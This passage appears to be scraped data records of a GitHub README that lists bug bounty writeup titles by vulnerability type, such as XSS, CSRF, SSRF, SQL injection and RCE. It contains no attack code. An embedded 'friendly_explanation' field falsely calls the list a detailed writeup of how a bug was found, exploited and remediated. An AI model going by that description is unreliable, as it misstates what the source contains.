403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#contributing", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#contributing. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in 